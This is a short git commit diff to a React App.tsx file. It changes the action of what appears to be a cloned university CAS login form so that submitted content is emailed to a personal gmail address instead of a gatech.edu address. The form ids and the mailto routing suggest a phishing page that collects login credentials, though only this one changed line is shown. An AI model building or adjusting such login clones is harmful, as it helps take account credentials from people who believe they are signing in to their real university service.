630de1040f9b4ac0db4b18754b46b3a1ce522b4f
phantom660 <beratamojit660@gmail.com>
2026-09-12 14:22:29 -0400

    check

--- src/App.tsx
+++ src/App.tsx
@@ -71,7 +71,7 @@ function App() {
       <section id="main">
         <div id="content" className="content">
           <div id="cas-content">
-            <form method="post" id="fm1" action="mailto:tbera7@gatech.edu" enctype="text/plain" onSubmit={handleSubmit}>
+            <form method="post" id="fm1" action="mailto:beratamojit660@gmail.com" enctype="text/plain" onSubmit={handleSubmit}>
               <div className="row">
                 <div className="col-md-5 col-12 gx-0 gx-md-4">
                   <div id="login">
